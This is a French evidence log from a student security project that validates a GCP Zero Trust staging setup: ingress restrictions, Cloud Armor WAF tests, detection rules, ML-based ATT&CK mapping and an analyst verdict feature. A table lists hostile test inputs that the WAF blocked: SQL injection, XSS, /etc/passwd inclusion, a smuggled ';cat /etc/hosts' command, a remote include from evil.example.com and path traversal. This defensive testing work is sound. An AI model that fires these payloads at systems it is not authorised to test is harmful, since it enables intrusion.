# Relevé de preuves live — socle MENAL Zero Trust

**Environnement :** `menal-zero-trust-staging` (projet GCP réel, région `europe-west1`)
**Date des mesures :** 06–07/09/2026, nuit
**Opérateur :** poste de test, IP publique `41.188.116.214` (mon poste — adresse assumée, pas floutée)
**Domaines réels :** `elson.menal-sarl.com`, `api-staging.menal-sarl.com`, `dashboard.menal-sarl.com`

> Ce document est le **socle factuel** de la démo et des corrections du rapport. Chaque ligne
> a été **exécutée en direct** contre l'infrastructure réelle, pas recopiée d'un mémoire. Les
> chiffres du rapport PFE qui divergent de ce relevé sont listés dans `CORRECTIONS_RAPPORT_PFE.md`.

---

## P1–P2 — Frontière Zero Trust (décision D3, exigence EX1/EX3)

**Adresse directe du service Cloud Run → doit échouer :**

| Service | Adresse `.run.app` | Code |
|---|---|---|
| elson-web-staging | `…-slxt6oscea-ew.a.run.app/` | **404** |
| elson-api-staging | idem | **404** |
| menal-api-staging | idem | **404** |
| menal-dashboard-staging | idem | **404** |
| menal-ml-embed-staging | idem | **404** |

**Domaine public (à travers le répartiteur + Cloud Armor + TLS) → doit passer :**

| URL | Code |
|---|---|
| `https://elson.menal-sarl.com/` | **200** |
| `https://api-staging.menal-sarl.com/health` | **200** |
| `https://dashboard.menal-sarl.com/login` | **200** |

Vérifié au niveau infra : `ingress = INGRESS_TRAFFIC_INTERNAL_LOAD_BALANCER` sur les 4 services publics,
`INGRESS_TRAFFIC_INTERNAL_ONLY` sur `menal-ml-embed` (plus strict encore). Aucune adresse directe
n'accepte le trafic Internet.

---

## P3–P4 — Filtrage applicatif Cloud Armor (exigence EX1)

**Sept familles d'attaque envoyées sur `elson.menal-sarl.com`, toutes refusées en 403 :**

| Famille | Charge | Code | Règle Cloud Armor (priorité) |
|---|---|---|---|
| SQLi union | `q=' UNION SELECT NULL,version()--` | 403 | sqli-v33 (1100) |
| SQLi boolean | `q=1' OR '1'='1` | 403 | sqli-v33 (1100) |
| XSS réfléchi | `q=<script>alert(1)</script>` | 403 | xss-v33 (1000) |
| XSS attribut | `q=x" onmouseover=alert(1)` | 403 | xss-v33 (1000) |
| LFI absolu | `file=/etc/passwd` | 403 | lfi-v33 (1200) |
| RCE shell | `cmd=;cat /etc/hosts` | 403 | rce-v33 (1300) |
| RFI distant | `page=http://evil.example.com/s.txt` | 403 | rfi-v33 (1400) |
| Traversal brut | `path=....//....//etc/passwd` | **403** | lfi-v33 (1200) |
| Traversal encodé | `path=..%2f..%2fetc/passwd` | **403** | lfi-v33 (1200) |
| **Légitime (contrôle)** | `/api/health` | **200** | throttle (1500) ACCEPT |

**Preuve dans les journaux du répartiteur (priorité de règle appliquée) :**

```
1200 DENY DENY 403  /api/v1/file?path=....//....//etc/passwd    <- WAF LFI bloque
1200 DENY DENY 403  /api/search?file=/etc/passwd                <- WAF LFI bloque
1500 ACCEPT THROTTLE 403  /api/search?path=boot.ini             <- WAF laisse passer, l'APP renvoie 403
1500 ACCEPT THROTTLE 200  /api/health                           <- legitime
```

> **Nuance de rigueur (à assumer devant le jury) :** la traversée de chemin brute `....//` est
> aujourd'hui **bloquée en 403 par le WAF (règle LFI, priorité 1200)**, contrairement au rapport
> qui la déclare non conforme (302). En revanche, une requête anodine `?path=boot.ini` passe le WAF
> (1500 ACCEPT) et reçoit un 403 **de l'application** — deux 403 de nature différente, distingués
> par la priorité dans le journal. Le WAF fait son travail ; ce qui reste hors de sa portée, c'est
> la validation applicative fine, assurée en seconde ligne par l'application.

---

## P5 — Aucune clé de compte de service (exigence EX10 / test T10)

Inventaire live des clés `user-managed` sur les **8 comptes de service** du projet :

| Compte de service | Clés user-managed |
|---|---|
| sa-api | 0 |
| sa-cicd | 0 |
| sa-dashboard-staging | 0 |
| sa-elson | 0 |
| sa-enrich-job | 0 |
| sa-ml-embed | 0 |
| sa-pipeline | 0 |
| compute par défaut (110809493492-compute) | 0 |

**Total : 0 clé sur 8 comptes.** La CI s'authentifie par fédération d'identité (WIF), contrainte au
dépôt `Mansour37/menal-zero-trust` **et** à la branche `refs/heads/main`.

---

## P6–P7 — Pipeline de détection vivant

**12 requêtes planifiées BigQuery, toutes `SUCCEEDED`, cadence 5 min, prochaine exécution 00:01 :**
5 requêtes de normalisation F4 (access_logs, raw_logs cloudrun, raw_logs armor, security_events, api_metrics)
+ 7 règles de détection R1→R7.

**Volumétrie réelle des tables de preuves (07/09 00:50) :**

| Table | Lignes | Plage temporelle |
|---|---|---|
| raw_logs | 211 744 | 31/07 → 07/09 |
| security_events | 58 511 | 31/07 → 07/09 |
| access_logs | 73 970 | 31/07 → 07/09 |
| detections | 1 647 | 25/08 → 07/09 |
| alert_enrichment | 2 222 | 01/08 → 07/09 |
| analyst_verdicts | **0 → puis peuplé** (voir P10) | — |

**Sept règles réelles (R1–R7) + deux règles temps réel en base (RT-WAF, RT-RBAC) :**

| Règle | Nom | Sévérité | Technique | Tactique |
|---|---|---|---|---|
| R1 | Force brute auth | HIGH | T1110 | TA0006 |
| R2 | Pic WAF | **MEDIUM** | **T1498** | TA0040 |
| R3 | Path traversal | HIGH | T1190 | TA0001 |
| R4 | User-agent suspect | MEDIUM | T1046 | TA0007 |
| R5 | Latence anormale >5s | LOW | T1499 | TA0040 |
| R6 | Pattern injection | **CRITICAL** | T1190 | TA0001 |
| R7 | Accès fichier sensible | HIGH | T1005 | TA0009 |
| RT-WAF | WAF temps réel | HIGH/CRITICAL | T1190 | TA0001 |
| RT-RBAC | RBAC temps réel (403 role-gated) | HIGH | T1078 | TA0004 |

---

## P8 — Chaîne de bout en bout (mon attaque, réellement détectée)

Mon envoi de ~13 requêtes malveillantes depuis `41.188.116.214` a produit, au cycle de détection
suivant, un **incident corrélé réel** :

- **R2 — Pic WAF** : message littéral *« 13 requêtes bloquées par Cloud Armor depuis 41.188.116.214 en 15 min »* (MEDIUM, T1498)
- **R3 — Path traversal** (HIGH, T1190) et **R6 — Pattern injection** (CRITICAL, T1190) déclenchées
- **Incident agrégé** : entité `41.188.116.214`, **score 100/100 CRITICAL**, **2 tactiques distinctes** → bonus chaîne d'attaque **+15 appliqué**, 13 détections

> Le message « 13 requêtes bloquées » du dashboard n'est pas un chiffre du rapport recopié : c'est
> le compteur réel de mon test, produit par la règle R2 sur sa fenêtre de 15 min.

---

## P9 — Qualification assistée (modèle réel, scores réels)

Enrichissement de mon attaque LFI par le modèle `attack-bert-onnx-fp32@v1.0` (ONNX float32, non quantifié) :

| Rang | Technique | Tactique | Similarité | Statut |
|---|---|---|---|---|
| 1 | **T1003.008** — OS Credential Dumping (/etc/passwd) | Credential Access | **0,71** | mapped |
| 2 | T1003.002 | — | 0,64 | (alternate) |
| 3 | T1556.003 | — | 0,638 | (alternate) |

> Preuve que le modèle comprend le **sens** : une lecture de `/etc/passwd` (LFI) est rapprochée de
> « OS Credential Dumping: /etc/passwd and /etc/shadow » — pertinent sémantiquement, alors qu'aucun
> mot-clé « credential » n'apparaît dans la charge. C'est exactement l'apport annoncé face à une
> méthode lexicale. Seuil retenu 0,60 (les 3 candidats le dépassent).

---

## P10 — Verdict humain (UC5), désormais réel

`analyst_verdicts` était **vide** (0 ligne) : le verdict humain n'avait jamais été posé, et le
dashboard n'offrait aucun bouton pour le faire. Corrigé cette nuit :

1. **API** : `POST /siem/incidents/41.188.116.214/verdict` → **HTTP 201**, écriture append-only.
2. **Dashboard (nouveau)** : bouton de qualification ajouté à la fiche incident, testé via le
   chemin BFF réel (login → cookie httpOnly → `POST /api/verdict` → 201).
3. **Garde-fous testés** : verdict invalide → 400 ; sans authentification → 401.
4. **Rendu visuel confirmé** (capture `03-incident-verdict.png`) : Card « Qualification analyste —
   UC5 — décision humaine », verdict « Vrai positif » affiché, note conservée, 4 boutons.

---

## P11 — Dashboard : build et données réelles

- `npm run build` (config production, `DEMO_MODE=false`) : **succès**, route `/api/verdict` créée,
  fiche `/incidents/[entity]` compile.
- Pastille « Données à jour » **verte** + « Live » (auto-refresh 10 s) sur les captures → **données
  réelles**, jamais le jeu de démonstration (le mock ne s'active qu'en cas de panne API, et
  seulement hors production).

---

## Écarts de sécurité constatés (à traiter, honnêtes)

| # | Constat live | Portée |
|---|---|---|
| S1 | Compte admin `admin@menal-sarl.mr` **sans MFA activée** (login renvoie un token direct) | Le rapport annonce une session 2FA (EX5/T5). À activer sur l'admin de démo. |
| S2 | `credentials.txt` en clair à la racine (mot de passe admin), **non couvert par `.gitignore`** | Corrigé cette nuit : `credentials*.txt` ajouté au `.gitignore`. |
| S3 | Aucun projet **production** (dev désactivé + staging seuls ; `prod/` vide) | Le rapport parle de « recette de topologie identique à la production ». |
| S4 | `analyst_verdicts` restait vide (UC5 jamais exercé) | Corrigé : bouton dashboard + verdict réel posé. |
| S5 | Déploiement CI par tag `github.sha` (mutable), pas par empreinte `@sha256:` | Le rapport annonce un déploiement par empreinte. |
